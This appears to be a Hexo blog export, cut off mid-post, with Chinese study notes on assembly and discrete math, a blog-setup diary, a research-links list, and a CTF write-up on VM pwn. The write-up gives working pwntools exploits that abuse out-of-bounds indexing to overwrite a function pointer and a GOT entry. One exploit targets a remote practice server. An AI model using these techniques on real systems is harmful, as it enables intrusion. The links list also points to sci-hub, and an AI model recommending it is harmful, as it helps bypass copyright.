<h3 id="六高级编程技术">六、<strong>高级编程技术</strong></h3>
<ol type="1">
<li><p><strong>子程序与宏</strong></p>
<ul>
<li><p><strong>子程序</strong>：<code>NEAR</code>（段内调用），<code>FAR</code>（段间调用）</p></li>
<li><p><strong>宏定义</strong>：</p>
<p>assembly</p>
<p>复制</p>
<p>下载</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">PRINT MACRO MSG</span><br><span class="line">    <span class="keyword">LEA</span> <span class="built_in">DX</span>, MSG</span><br><span class="line">    <span class="keyword">MOV</span> <span class="number">AH</span>, <span class="number">09H</span></span><br><span class="line">    <span class="keyword">INT</span> <span class="number">21H</span></span><br><span class="line">ENDM</span><br></pre></td></tr></table></figure></li>
<li><p><strong>区别</strong>：宏展开代码长但速度快；子程序省空间但调用慢49</p></li>
</ul></li>
<li><p><strong>中断处理</strong></p>
<ul>
<li><strong>中断向量表</strong>：00000H~003FFH（1KB），每项4字节（CS:IP）4</li>
<li><strong>DOS功能调用</strong>：
<ul>
<li><code>01H</code>：键盘输入 → <code>AL</code></li>
<li><code>02H</code>：显示字符（<code>DL=ASCII</code>）</li>
<li><code>09H</code>：显示字符串（<code>DS:DX=缓冲区首址</code>，以<code>$</code>结尾）</li>
<li><code>0AH</code>：输入字符串（缓冲区格式：<code>[长度],[实际长度],[内容]</code>）37</li>
</ul></li>
</ul></li>
</ol>
<hr />
<h3 id="七调试与开发环境">七、<strong>调试与开发环境</strong></h3>
<ol type="1">
<li><strong>程序开发流程</strong>
<ul>
<li>编辑（.ASM）→ 汇编（.OBJ）→ 连接（.EXE）→ 调试（DEBUG）6</li>
</ul></li>
<li><strong>DEBUG常用命令</strong>
<ul>
<li><code>U</code>：反汇编，<code>T</code>：单步执行，<code>G</code>：断点执行，<code>D</code>：查看内存6</li>
</ul></li>
</ol>
<hr />
<h3 id="八典型试题解析">八、<strong>典型试题解析</strong></h3>
<ol type="1">
<li><p><strong>填空题</strong></p>
<ul>
<li>例：指令 <code>MOV AX, [BP+SI+2]</code> 的有效地址 =
<code>BP+SI+2</code>，物理地址 = <code>SS×16 + 有效地址</code>14</li>
</ul></li>
<li><p><strong>程序阅读</strong></p>
<ul>
<li>反转字符串程序关键点：
<ul>
<li><code>LEA DI, BUF+2</code>（字符串首）</li>
<li><code>MOV SI, DI + AX -1</code>（字符串尾）</li>
<li><code>XCHG AL, [DI]</code> 交换首尾字符7</li>
</ul></li>
</ul></li>
<li><p><strong>编程题</strong></p>
<ul>
<li><p>大小写转换：</p>
<p>assembly</p>
<p>复制</p>
<p>下载</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 大写转小写：OR AL, 00100000B</span></span><br><span class="line"><span class="comment">; 小写转大写：AND AL, 11011111B</span></span><br></pre></td></tr></table></figure></li>
<li><p>BCD码转二进制：按权展开求和37</p></li>
</ul></li>
</ol>
<hr />
<p><strong>高分策略</strong>：</p>
<ol type="1">
<li><strong>重点突破</strong>：物理地址计算、寻址方式、标志位判断（近3年高频考点）168。</li>
<li><strong>刷题方向</strong>：
<ul>
<li>寄存器组合寻址（如 <code>[BX+SI+idata]</code>）</li>
<li>移位指令应用（如 <code>SHL AX,1</code> 实现×2）</li>
<li>DOS功能调用（09H/0AH必考）79。</li>
</ul></li>
<li><strong>考前模拟</strong>：完成2-3套真题（参考南邮/郑大试题）37。</li>
</ol>
<blockquote>
<p>💡
<strong>核心提示</strong>：考试中若遇复杂物理地址计算，先计算<code>段地址×16</code>再+偏移地址，注意十六进制进位（如<code>1000H×16=10000H</code>）。堆栈操作牢记“先进后出”，<code>PUSH</code>时<code>SP-2</code>，<code>POP</code>时<code>SP+2</code>610。</p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>博客搭建</title>
    <url>/2024/10/12/%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<h1 id="搭建心路">搭建心路</h1>
<span id="more"></span>
<h2 id="一准备工具环境">一、准备工具/环境</h2>
<p>一个趁手的魔法上网工具（GitHub真的好慢），node.js，hexo，typora，git（这玩意官网下也好慢）</p>
<h2 id="二博客的搭建">二、博客的搭建</h2>
<p>工欲善其事，必先利其器。为了流畅且丝滑的搭建博客，我浏览了一些B站视频，并从中选取了最短的一个来作为学习模板（懒狗一条了属于是）。在搭建过程中仅有一次报错，为“error
deployer not found: git“，在
csdn上了解到，这是由于没有安装hexo-deployer-git插件，根据网址的教学运行npm
install hexo-deployer-git –save便成功解决</p>
<p>搭建过程中并没有截什么图，便自然只有文字了</p>
<h2 id="三搭建过程">三、搭建过程</h2>
<p>1.安装所需软件并配置环境</p>
<p>2.去GitHub白嫖免费服务器并搞定ssh链接</p>
<p>3.更改一些_config.yaml下的配置</p>
<p>4.改个主题并部署网页</p>
<h2 id="四参考的视频以及文章">四、参考的视频以及文章</h2>
<p>参考的视频以及文章</p>
<p>感谢各位前辈留下的宝贵资料</p>
<p><a
href="https://blog.csdn.net/qq_41688840/article/details/125826614">部署hexo遇到报错ERROR
Deployer not found: git的解决办法-CSDN博客</a></p>
<p>[<a
href="https://www.bilibili.com/video/BV1Eg41157tL/?spm_id_from=333.337.search-card.all.click&amp;vd_source=0a239ca12066e72b92ef0094a8ca6ef0">教程]Hexo
&amp; Github搭建自己的专属博客_哔哩哔哩_bilibili</a></p>
<h2 id="五在搭建博客中有感">五、在搭建博客中有感</h2>
<p>博客的搭建需要一些耐心和善用搜索引擎，大部分问题前人都给了详尽的回答，我们只需要站在巨人的肩膀上，到虽然我没有遇到多少报错，但是从帮助舍友搭建博客时来看，几乎现阶段能遇到的所有报错都可以在网上找到解决方式，甚至有的报错只需要翻译一下就能看懂错在哪里。</p>
]]></content>
  </entry>
  <entry>
    <title>vmpwn初探</title>
    <url>/2025/03/15/%E4%B8%80%E3%80%81my_vm%20wp/</url>
    <content><![CDATA[<h1 id="一my_vm-wp">一、my_vm wp</h1>
<p>由于一点狗运和时间硬磨，在校赛拿下了这题</p>
<p>以下是wp</p>
<p>分析 checksec</p>
<p><img
src="https://p.sda1.dev/22/68f36e05252077d9d862492f375f9922/CH.png" /></p>
<p>开始IDA</p>
<p><img
src="https://p.sda1.dev/22/a8bdb5bfb008295246d5807f7460cec3/ida.png" /></p>
<p>这里将一个打印函数的指针赋值给了另一个指针常量，这个常量位于bss段，而且和题目的一个可操纵内存段相邻，导致存在被篡改的风险
同时题目也给出了backdoor</p>
<p><img
src="https://p.sda1.dev/22/8c9196d54b788b322ec12e51842c6162/IDA2.png" /></p>
<p>接下来接着看这里面的很多输入变量都是unsigned
int型，导致没办法恶意输入负数
然后接着看看指令集大部分指令都是简单的把reg内容运算后放进第三个reg
看一下提示</p>
<p><img
src="https://p.sda1.dev/22/c5f8c3d4493826a8d45487113a597806/ts.png" /></p>
<p>结合提示和前面的内容可以得知，像一条0x12345678这样的指令中，0x12、0x4、0x6、0x8被分别取出，然后可以到指令逻辑部分对应查看，会发现0x6和0x8的对应变量是类似于源寄存器的作用，而0x4则对应目标寄存器，0x12则会在开始前通过if判断，所以它应该是指令号，那么接下来就是分析可以用的指令了
movq： 前面看常量初始化的时候也提到了，栈操作指令是用不了的
但是会发现另一个可以更改内存的指令就不大对劲了：</p>
<p><img
src="https://p.sda1.dev/22/8ad210c4ee5c298738934d0fdb39191a/jcq.png" /></p>
<p>这个指令看起来像是把源1的内容mov进 目标寄存器作索引指向的位置
但是会发现中间过了一个result变量，而这个变量是int型的：</p>
<p><img
src="https://p.sda1.dev/22/2366032555582c20473d9a074e226fcb/2.png" />那么显然如果目标寄存器为负数，这个赋值就可以动到VM_memory前面的内存</p>
<p><img
src="https://p.sda1.dev/22/12702fc5072218fd07049b9fbdea7cb2/1.png" /><br />
而VM_memory前面是有got表和funcptr常量的，显然可以利用这个指令去篡改funcptr指针或者got表
这个指令称之为movq mov_immed：再者就是这个将立即数放进reg的指令</p>
<p><img
src="https://p.sda1.dev/22/2366032555582c20473d9a074e226fcb/2.png" /></p>
<p>这个指令的格式提示里其实也是有，就是低2字节作为立即数使用
但有一个特殊点是：
由于execute开头对寄存器check的存在，导致这里没办法简单的直接使用某些数值：</p>
<p><img
src="https://p.sda1.dev/22/6e2717b9b1e75e2df5a82fe0143b9199/2s.png" /></p>
<p>因为这个就相当于是将code中的某几位限制为0xb以内，也就是说这几位上不能出现0xb更大的数
主要的影响就是：没办法直接写完整backdoor地址、没办法直接写负数，但是这些可以通过与其他指令结合来解决
然后就是指令链的构造了： 首先需要在reg数组中产生几个数值：
作为篡改定位的索引使用的 -8，作为篡改目标的backdoor地址 0x400877
首先可以用mov_immed指令将1和9放进reg，然后相减产生-8再放进去
接着ackdoor地址：0x400877
如果要分的话，分成0x40和0x0877比较合理，这样才是完整的字节，不过无所谓，为了好理解，可以直接劈两半：
然后只需要将0x400左移为0x400000，再将0x877加上去就可以了
VM_memory起始地址是0x6020e0，数组为4字节一单元，可以简单看出funcptr为-8的位置</p>
<p><img
src="https://p.sda1.dev/22/d0a18b54df5fe336df2b8b34ac4905d2/JSQ.png" /></p>
<p>确实是成功的将位置定在了funcptr上
这样一来在main函数结束时，funcptr调用后就会被劫持到backdoor函数中了</p>
<p>EXP</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">from</span> pwn import *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="attribute">r</span> = process(<span class="string">&quot;./my_vm&quot;</span>)  </span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b execute&quot;)  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">backdoor</span> = <span class="number">0</span>x400877 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">vm_code</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x10 &lt;&lt; <span class="number">24</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) | <span class="number">1</span>) + <span class="string">&quot;\n&quot;</span> </span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x10 &lt;&lt; <span class="number">24</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">16</span>) | <span class="number">9</span>) + <span class="string">&quot;\n&quot;</span> </span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x50 &lt;&lt; <span class="number">24</span>) | (<span class="number">3</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">8</span>) | <span class="number">2</span>) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x10 &lt;&lt; <span class="number">24</span>) | (<span class="number">5</span> &lt;&lt; <span class="number">16</span>) | <span class="number">0</span>x877) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x10 &lt;&lt; <span class="number">24</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">16</span>) | <span class="number">0</span>x400) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x10 &lt;&lt; <span class="number">24</span>) | (<span class="number">4</span> &lt;&lt; <span class="number">16</span>) | <span class="number">3</span>) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x40 &lt;&lt; <span class="number">24</span>) | (<span class="number">7</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">2</span> &lt;&lt; <span class="number">8</span>) | <span class="number">4</span>) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x80 &lt;&lt; <span class="number">24</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">8</span>) | <span class="number">7</span>) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x40 &lt;&lt; <span class="number">24</span>) | (<span class="number">5</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">5</span> &lt;&lt; <span class="number">8</span>) | <span class="number">6</span>) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"></span><br><span class="line"><span class="attribute">vm_code</span> += str((<span class="number">0</span>x90 &lt;&lt; <span class="number">24</span>) | (<span class="number">3</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">5</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0</span>) + <span class="string">&quot;\n&quot;</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>.sendlineafter(<span class="string">&quot;IP:&quot;</span>, <span class="string">&quot;0&quot;</span>)  </span><br><span class="line"><span class="attribute">r</span>.sendlineafter(<span class="string">&quot;SP:&quot;</span>, <span class="string">&quot;1&quot;</span>) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>.sendlineafter(<span class="string">&quot;to execve:&quot;</span>, str(vm_code.count(<span class="string">&quot;\n&quot;</span>)))  </span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>.send(vm_code)</span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="二vm-pwm初探">二、vm pwm初探</h1>
<p>其实本意是想写web-pwn的，但是php还不是很熟练，那题水果忍者也没搞定（orz），再沉淀沉淀再写</p>
<p>vmpwn说简单点就是把出栈，进栈，寄存器，bss段等单独申请一块空闲实现相关的功能，也可以说说直接把一些汇编命令通过一些函数来实现，非常考验逆向能力，大部分的vmpwn的切入点大多是不安全的下标，通过下标来泄露一些东西或者修改一些东西之类的</p>
<p>要点就是两个——一点逆向基础和你的耐心（因为代码量一般都比较大）</p>
<p>至于独立的知识点好像并不多</p>
<p>非要说就以下几点</p>
<ol type="1">
<li><code>PC</code>程序计数器，存放的是一个内存地址，该地址中存放着下一条要执行的计算机指令（在程序中
<code>PC</code>的初始值指向目标代码的 <code>main</code>函数。）</li>
<li><code>SP</code>指针寄存器，永远指向当前栈顶</li>
<li><code>BP</code>基址寄存器，用于指向栈的某些地址，在调用函数的时候会用到</li>
<li><code>AX</code>通用寄存器，用于存放一条指令执行后的结果</li>
<li>指令集，虚拟机定义的时候，会定义一个全局变量的枚举类型，里面有我们需要的指令
如：<code>MOV</code>, <code>ADD</code>之类的。</li>
</ol>
<p>所以在做题的时候我们应该把逆向的重点放在模拟的寄存器的初始值，功能和指令等等</p>
<p>接下来就是找点题玩的环节</p>
<h2 id="ciscn_2019_qual_virtual">1.ciscn_2019_qual_virtual</h2>
<p>先checksec一下</p>
<p><img
src="https://p.sda1.dev/22/77a594fb249e9002e43fc311475c9c72/1AXLFT.png" /></p>
<p>浅看一下主程序</p>
<p><img
src="https://p.sda1.dev/22/b78aa7d52e70a236f4fa5c5e74a7bf1b/11.png" /></p>
<p><img
src="https://p.sda1.dev/22/0ef0ffbb3683e922db7bf398512b6106/14.png" /></p>
<p><img
src="https://p.sda1.dev/22/de062ec3be7f6e4b16f37941fb80421d/12.png" /></p>
<p>接下来就一个个分析</p>
<ul>
<li><p>get</p>
<p>取出 opcode 并返回：<code>*a2=*(segment+idx--)</code></p></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">get</span><span class="params">(<span class="type">void</span> **a1, _QWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)a1 + <span class="number">3</span>) == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  *a2 = *((_QWORD *)*a1 + (<span class="type">int</span>)(*((_DWORD *)a1 + <span class="number">3</span>))--);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>push</p>
<p>从stack取出数据，放到data里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">push</span><span class="params">(<span class="type">void</span> **data_addr, <span class="type">void</span> **stack_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 a2; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> get(stack_addr, &amp;a2) &amp;&amp; copy(data_addr, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>pop</p>
<p>从data取出数据，放到stack里</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">pop</span><span class="params">(<span class="type">void</span> **data_addr, <span class="type">void</span> **stack_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> get(data_addr, &amp;v3) &amp;&amp; copy(stack_addr, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>add</p></li>
</ul>
<p>从data中取两个值相加，放到data</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">add</span><span class="params">(<span class="type">void</span> **data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 a2; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( get(data_addr, &amp;a2) &amp;&amp; get(data_addr, &amp;v3) )</span><br><span class="line">    <span class="keyword">return</span> copy(data_addr, v3 + a2);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>sub，mul，div与add相似，为对应的减，乘，除</p></li>
<li><p>load</p></li>
</ul>
<p>从data里取出一个值a2作为下标，并将该下标对应的值放入data中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">load</span><span class="params">(<span class="type">void</span> **data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 a2; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)get(data_addr, &amp;a2) )</span><br><span class="line">    <span class="keyword">return</span> copy(data_addr, *((_QWORD *)*data_addr + *((<span class="type">int</span> *)data_addr + <span class="number">3</span>) + a2));</span><br><span class="line">  <span class="comment">//copy(data_addr,*(data+idx+a2))</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>save</li>
</ul>
<p>从data里取出值v2作为下标和v3作为值，将v3赋值给v2下标对应的值</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">save</span><span class="params">(<span class="type">void</span> **data_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !get(data_addr, &amp;v2) || !get(data_addr, &amp;v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  *(*data_addr + *(data_addr + <span class="number">3</span>) + v2) = v3;</span><br><span class="line">  <span class="comment">//*(data+idx+v2)=v3</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>现在需要做的就是改puts_got为system，因为有save这个任意地址写，所以我们可以先将data这个段给劫持到0x4040d0这里。方便后续的通过data段来改puts</p>
<p><img
src="https://p.sda1.dev/22/092ab0ea9328b5bd51271a3b19520dc0/13.png" /></p>
<p>当data到了0x4040d0这里之后，需要将puts的地址给读入到data里，算一下puts_got和劫持完成之后data的偏移为0xb0也就是-21的偏移，利用load读的漏洞将puts_got这里的地址读到0x4040d0。puts_got和system的偏移算出来之后利用add将data里的puts_addr
+
-0x2a300就可以将data里的puts_addr改成system，最后将data里的system利用save放到puts_got里还是-25的偏移。</p>
<p>EXP</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context(<span class="attribute">arch</span>=<span class="string">&#x27;amd64&#x27;</span>, <span class="attribute">os</span>=<span class="string">&#x27;linux&#x27;</span>, <span class="attribute">log_level</span>=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, 28718) </span><br><span class="line"><span class="comment">#r = process(&#x27;./qv&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your program name:\n&#x27;</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your instruction:\n&#x27;</span>, <span class="string">&#x27;push push save push load push add push save&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;Your stack data:\n&#x27;</span>, f<span class="string">&#x27;&#123;0x4040d0&#125; -3 -21 &#123;-0x2a300&#125; -21&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/10/12/%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<span id="more"></span>
<p>title: 测试 date: 2024-10-12 23:32:22 tags:text</p>
<p>仅为测试使用</p>
]]></content>
  </entry>
  <entry>
    <title>科研常用网址</title>
    <url>/2025/07/03/%E7%A7%91%E7%A0%94%E5%B8%B8%E7%94%A8%E7%BD%91%E5%9D%80/</url>
    <content><![CDATA[<p>计算机领域如何寻找idea：加州大学河滨分校钱志云老师写的计算机领域如何找idea的一篇文章。（需要科学上网才能访问）</p>
<p>如何阅读一篇论文：来源于滑铁卢大学Keshav教授。分享了一种“Three-pass”的方法。分三遍去读，每一遍都有明确的目标，是循序渐进的过程</p>
<p>给博士生的建议：港科大教授Dimitris
Papadias写的。从很多方面给出了建议，包括goal、motivation、presentation、paper
writing等等</p>
<p>学术论⽂写作⽅法和技巧：清华大学刘洋老师的论文写作技巧和科研经验分享。</p>
<p>写好英语科技论文的诀窍：印地安那大学周耀旗老师的论文写作技巧分享。</p>
<p>英文学术写作实战：国科大Torsten老师讲的论文写作课。</p>
<p>工具</p>
<p>The Writer’s Diet：学术写作课老师推荐的网址，可以检查英语写得地不地道
grammarly：检查有没有出现语法错误的工具
phrasebank：曼切斯特大学整理的论文常用句式 Overleaf, Online LaTeX
Editor：在线的latex编辑器
如何建立独属于你自己的论文数据库：清华网安博士生写的一个利用zotero和dblp建立自己的论文数据库的教程。其实也是推荐一些文献管理工具。
ccf ddl：CCF列表会议的截止日期列表 dblp: computer science
bibliography：检索论文的网站，可以配合一些文献整理工具（如zotero）一键导入生成bib。
计算机最新国际会议和期刊列表 - Conference Partner
(会伴)：收集了会议的接收率，截止日期，ccf类别等信息的网站，适合在投稿的时候找会议期刊用。
connected paper：调研神器。给定一个论文，能找到与他相关的论文。
sci-hub：下论文神器。遇到收费的论文，把论文的doi复制到这个网址，就能下载论文了。
github：能找到很多开源工作和大佬的主页，除此之外，awesome-list能找到相当多的资源，如awesome-fuzz就能找到模糊测试相关的课程、项目、论文等资源。
conference rank：能查看会议的排名，主要是查ERA和qualis的弄的排名 google
h5:可以查会议的H5指数。某种角度能看出会议的录取难度。 latex画图：
https://www.tablesgenerator.com/ https://www.latex-tables.com/</p>
<p>原文链接：https://blog.csdn.net/u013648063/article/details/122048461</p>
]]></content>
  </entry>
  <entry>
    <title>离散数学基础</title>
    <url>/2025/06/23/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%EF%BC%88%E6%A0%B8%E5%BF%83%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
    <content><![CDATA[<h3
id="一命题逻辑核心基础"><strong>一、命题逻辑（核心基础）</strong></h3>
<ol type="1">
<li><strong>命题符号化</strong>
<ul>
<li>原子命题识别、联结词（¬∧∨→↔︎）的精确转化</li>
<li>例题：<code>¬T ↔︎ (¬S → t)</code>
的自然语言解释（成年规则与身高条件的等价性）</li>
</ul></li>
<li><strong>公式分类与化简</strong>
<ul>
<li>永真式（重言式）、永假式（矛盾式）、可满足式</li>
<li><strong>化简方法</strong>：逻辑等价式（德摩根律、分配律、吸收律等）</li>
<li>重点题型：<code>((¬P∨Q)↔︎(Q∨¬P))∧P</code> → 简化为
<code>P</code></li>
</ul></li>
<li><strong>范式理论（考试重点）</strong>
<ul>
<li><strong>主析取范式（PDNF）</strong>：极小项析取 →
<strong>求所有成真赋值</strong></li>
<li><strong>主合取范式（PCNF）</strong>：极大项合取 →
<strong>求所有成假赋值</strong></li>
<li>步骤：真值表→按赋值构造极小项/极大项→析取/合取</li>
</ul></li>
<li><strong>演绎证明</strong>
<ul>
<li>推理规则：MP（假言推理）、MT（拒取式）、HS（三段论）、DS（析取三段论）</li>
<li>解题流程：符号化前提→逐步推导→验证结论有效性</li>
<li>典型题：<em>“若6偶则2不整除7；5非素或2整除7；5是素。故6奇”</em>
的真伪验证</li>
</ul></li>
</ol>
<hr />
<h3
id="二谓词逻辑进阶难点"><strong>二、谓词逻辑（进阶难点）</strong></h3>
<ol type="1">
<li><strong>符号化关键</strong>
<ul>
<li>量词（∀∃）的辖域与顺序（<code>∀x∃y</code> vs <code>∃y∀x</code>
差异显著）</li>
<li>案例：<em>“所有学员钦佩某些老师”</em> →
<code>∀x(S(x)→∃y(T(y)∧A(x,y)))</code></li>
</ul></li>
<li><strong>演绎证明</strong>
<ul>
<li><strong>规则拓展</strong>：UI（全称实例化）、EI（存在实例化）、UG（全称推广）、EG（存在推广）</li>
<li><strong>核心限制</strong>：EI引入<strong>新常元</strong>；UG仅用于<strong>任意常元</strong></li>
<li>经典题：<code>∃xP(x)→∀y[(P(y)∨Q(y))→R(y)], ∃xP(x) ⇒ ∃xR(x)</code>
的证明构造</li>
</ul></li>
<li><strong>应用题型</strong>
<ul>
<li>符号化复杂命题（如实数分类问题）</li>
<li>用谓词逻辑证明结论（例：从前提推导存在有理数）</li>
</ul></li>
</ol>
<hr />
<h3
id="三集合与二元关系高频考点"><strong>三、集合与二元关系（高频考点）</strong></h3>
<ol type="1">
<li><p><strong>集合运算</strong></p>
<ul>
<li>交并差补（∩∪−）、对称差（Δ）、幂集（P(A)）</li>
<li>包含关系：子集（⊆）、真子集（⊂）、集合相等</li>
</ul></li>
<li><p><strong>二元关系性质</strong></p>
<ul>
<li><strong>五大性质判定</strong>：自反性、对称性、传递性、反自反性、反对称性</li>
<li><strong>判定工具</strong>：关系矩阵（主对角线/对称性）、关系图（自环/双向边）</li>
<li><strong>闭包运算</strong>：自反闭包（<code>r(R)=R∪I_A</code>）、对称闭包（<code>s(R)=R∪R⁻¹</code>）</li>
</ul></li>
<li><p><strong>特殊关系</strong></p>
<ul>
<li><p><strong>等价关系</strong>：自反+对称+传递 →
等价类与商集（<code>A/~</code>）</p></li>
<li><p><strong>偏序关系</strong>：自反+反对称+传递 →
<strong>哈斯图绘制</strong></p>
<ul>
<li>哈斯图简化：去自环、去传递边、箭头向上</li>
</ul></li>
<li><p><strong>元素判定</strong>（重点！）：</p>
<table>
<thead>
<tr>
<th style="text-align: left;">概念</th>
<th style="text-align: left;">定义</th>
<th style="text-align: left;">唯一性</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;">最大/最小元</td>
<td style="text-align: left;">所有元素≤g / ≥l</td>
<td style="text-align: left;">至多一个</td>
</tr>
<tr>
<td style="text-align: left;">极大/极小元</td>
<td style="text-align: left;">无更大元素 / 无更小元素</td>
<td style="text-align: left;">可有多个</td>
</tr>
<tr>
<td style="text-align: left;">上/下界</td>
<td style="text-align: left;">子集中所有元素≤u / ≥l</td>
<td style="text-align: left;">可不存在</td>
</tr>
<tr>
<td style="text-align: left;">上/下确界</td>
<td style="text-align: left;">上界的最小元/下界的最大元</td>
<td style="text-align: left;">唯一</td>
</tr>
</tbody>
</table></li>
</ul></li>
</ol>
<hr />
<h3 id="四图论核心应用"><strong>四、图论（核心应用）</strong></h3>
<ol type="1">
<li><strong>图基础</strong>
<ul>
<li>握手定理：无向图 <code>∑deg(v)=2|E|</code>；有向图
<code>∑deg⁺(v)=∑deg⁻(v)=|E|</code></li>
<li>同构判定：顶点数、边数、度序列、子图结构匹配</li>
</ul></li>
<li><strong>树与生成树</strong>
<ul>
<li>树定义（连通无环 &amp; |E|=|V|-1）</li>
<li><strong>最小生成树算法</strong>：
<ul>
<li>Kruskal：按边权升序+避圈（并查集实现）</li>
<li>Prim：从点出发+贪心选最小边（优先队列实现）</li>
</ul></li>
</ul></li>
<li><strong>特殊图判定（重点！）</strong>
<ul>
<li><strong>欧拉图</strong>：所有顶点度偶 →
<strong>存在回路</strong></li>
